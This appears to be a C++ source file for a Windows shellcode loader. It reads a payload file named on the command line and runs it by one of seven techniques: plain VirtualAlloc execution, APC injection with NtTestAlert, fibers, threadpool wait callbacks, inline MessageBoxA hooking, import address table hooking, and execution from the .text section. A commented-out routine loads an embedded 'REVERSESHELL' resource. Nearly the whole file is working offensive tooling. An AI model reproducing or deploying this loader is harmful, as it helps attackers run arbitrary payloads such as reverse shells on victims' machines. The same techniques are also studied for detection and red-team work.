#include <iostream>
#include <string>
#include <fstream>
#include <windows.h>
#include <tlhelp32.h>
#include <vector>
#include <winternl.h>

#pragma comment(lib, "ntdll")
using myNtTestAlert = NTSTATUS(NTAPI*)();

int option, shellSize = 0;
char* shellCode;
std::string filePath = "";

int LoadShellCode() {
	std::ifstream myfile(filePath, std::ios::in | std::ios::binary | std::ios::ate);
	std::streampos size;
	if (myfile.is_open())
	{
		size = myfile.tellg();
		shellCode = new char[size];
		myfile.seekg(0, std::ios::beg);
		myfile.read(shellCode, size);
		shellSize = size;
		myfile.close();
		return 0;
	}
	return 1;
}

void CreateThread() { /* If notepad are open, inject and exec shellcode. If not, create a notepad*/
	/*Connection gone -> process gone*/
	/* Load && exec shellcode nicely */
	void* exec = VirtualAlloc(0, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellCode, shellSize);
	((void(*)())exec)();
}

//void LoadFromResource() {/*Local process gone when connection gone*/
//	HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_REVERSESHELL1), L"REVERSESHELL");
//	DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);
//	HGLOBAL shellcodeResouceData = LoadResource(NULL, shellcodeResource);
//
//	void* exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
//	memcpy(exec, shellcodeResouceData, shellcodeSize);
//	((void(*)())exec)();
//}


void ApcQueueCodeInjectionAndNtTestAlert() {
	myNtTestAlert testAlert = (myNtTestAlert)(GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert"));
	LPVOID shellAddress = VirtualAlloc(NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	//WriteProcessMemory(GetCurrentProcess(), shellAddress, shellCode, shellSize, NULL);
	memcpy(shellAddress, shellCode, shellSize);
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
	QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), NULL);
	testAlert();
}

void ShellcodeExecutionViaFibers() {
	//convert main thread to fiber
	PVOID mainFiber = ConvertThreadToFiber(NULL);

	PVOID shellcodeLocation = VirtualAlloc(0, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	//WriteProcessMemory(GetCurrentProcess(), shellcodeLocation, shellCode, shellSize, NULL);
	memcpy(shellcodeLocation, shellCode, shellSize);

	//create a fiber that will execute the shellcode
	PVOID shellcodeFiber = CreateFiber(NULL, (LPFIBER_START_ROUTINE)shellcodeLocation, NULL);

	// manually schedule the fiber that will execute our shellcode
	SwitchToFiber(shellcodeFiber);
}

void ShellcodeExecutionViaCreateThreadpoolWait() {
	HANDLE event = CreateEvent(NULL, FALSE, TRUE, NULL);
	LPVOID shellcodeAddress = VirtualAlloc(NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	RtlMoveMemory(shellcodeAddress, shellCode, shellSize);

	PTP_WAIT threadPoolWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)shellcodeAddress, NULL, NULL);
	SetThreadpoolWait(threadPoolWait, event, NULL);
	WaitForSingleObject(event, INFINITE);
}



LPVOID messageBoxAddress = NULL;
SIZE_T bytesWritten = 0;
char messageBoxOriginalBytes[14] = {};

int __stdcall HookedMessageBox(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {
	LPVOID exec = VirtualAlloc(0, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellCode, shellSize);
	((void(*)())exec)();
	// unpatch MessageBoxA
	WriteProcessMemory(GetCurrentProcess(), (LPVOID)messageBoxAddress, messageBoxOriginalBytes, sizeof(messageBoxOriginalBytes), &bytesWritten);
	// call the original MessageBoxA
	return MessageBoxA(NULL, lpText, lpCaption, uType);
}

void WindowsAPIHooking()
{
	HINSTANCE library = LoadLibraryA("user32.dll");
	SIZE_T bytesRead = 0;
	DWORD dwOldProtect;
	// get address of the MessageBox function in memory
	messageBoxAddress = GetProcAddress(library, "MessageBoxA");
	
	int check = VirtualProtect(messageBoxAddress, 14, PAGE_EXECUTE_READWRITE, &dwOldProtect);
	// save the first 6 bytes of the original MessageBoxA function - will need for unhooking
	ReadProcessMemory(GetCurrentProcess(), messageBoxAddress, messageBoxOriginalBytes, 14, &bytesRead);
	
	// create a patch "push <address of new MessageBoxA); ret"
	void* hookedMessageBoxAddress = &HookedMessageBox;

	char patch[14] = { 0 };
	LPCVOID tmp_2 = (LPCVOID)((DWORD)(((DWORD64)(&HookedMessageBox) & 0xFFFFFFFF00000000)>>32));
	LPCVOID tmp_1 = (LPCVOID)((DWORD)(DWORD64)(&HookedMessageBox) & 0xFFFFFFFF);
	memcpy_s(patch, 1, "\x68", 1);
	memcpy_s(patch + 1, 4, &tmp_1, 4);
	memcpy_s(patch + 5, 4, "\xC7\x44\x24\x04", 4);
	memcpy_s(patch + 9, 4, &tmp_2, 4);
	memcpy_s(patch +13, 1, "\xc3", 1);
	
	// patch the MessageBoxA
	WriteProcessMemory(GetCurrentProcess(), (LPVOID)messageBoxAddress, &patch, 14, &bytesWritten);

	// show messagebox after hooking
	MessageBoxA(NULL, "hi", "hi", MB_OK);
}

void ImportAdressTableHooking() {
	// get target process image base address
	LPVOID imageBase = GetModuleHandleA(NULL);

	// get AddressOfEntryPoint
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);

	PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
	IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)imageBase);
	LPCSTR libraryName = NULL;
	HMODULE library = NULL;
	PIMAGE_IMPORT_BY_NAME functionName = NULL;

	while (importDescriptor->Name != NULL)
	{
		libraryName = (LPCSTR)importDescriptor->Name + (DWORD_PTR)imageBase;
		library = LoadLibraryA(libraryName);

		if (library)
		{
			PIMAGE_THUNK_DATA originalFirstThunk = NULL, firstThunk = NULL;
			originalFirstThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)imageBase + importDescriptor->OriginalFirstThunk);
			firstThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)imageBase + importDescriptor->FirstThunk);

			while (originalFirstThunk->u1.AddressOfData != NULL)
			{
				functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)imageBase + originalFirstThunk->u1.AddressOfData);

				// find MessageBoxA address
				if (std::string(functionName->Name).compare("MessageBoxA") == 0)
				{
					SIZE_T bytesWritten = 0;
					DWORD oldProtect = 0;
					VirtualProtect((LPVOID)(&firstThunk->u1.Function), 8, PAGE_READWRITE, &oldProtect);

					// swap MessageBoxA address with address of hookedMessageBox
					firstThunk->u1.Function = (DWORD_PTR)HookedMessageBox;
				}
				++originalFirstThunk;
				++firstThunk;
			}
		}
		importDescriptor++;
	}
	// message box after IAT hooking
	MessageBoxA(NULL, "Hello after Hooking", "Hello after Hooking", 0);
}


#pragma section(".text")

__declspec(allocate(".text")) char goodcode[1024];

void LocalShellcodeExecutionWithoutVirtualAlloc() {
	DWORD dwOldProtect;
	VirtualProtect(goodcode, sizeof(goodcode), PAGE_EXECUTE_READWRITE, &dwOldProtect);
	memcpy_s(goodcode, shellSize, shellCode, shellSize);
	(*(void(*)())(&goodcode))();
}


int main(int argv, char* argc[])
{
	if (argv != 5 || std::string(argc[1]) != "-f" || std::string(argc[3]) != "-t") return 0;
	filePath = argc[2];
	option = atoi(argc[4]);

	if (LoadShellCode() != 0) return 0;
	switch (option) {
	case 1:
		CreateThread();
		break;
	case 2:
		ApcQueueCodeInjectionAndNtTestAlert();
		break;
	case 3:
		ShellcodeExecutionViaFibers();
		break;
	case 4:
		ShellcodeExecutionViaCreateThreadpoolWait();
		break;
	case 5:
		WindowsAPIHooking();
		break;
	case 6:
		ImportAdressTableHooking();
		break;
	case 7:
		LocalShellcodeExecutionWithoutVirtualAlloc();
		break;
	}


}

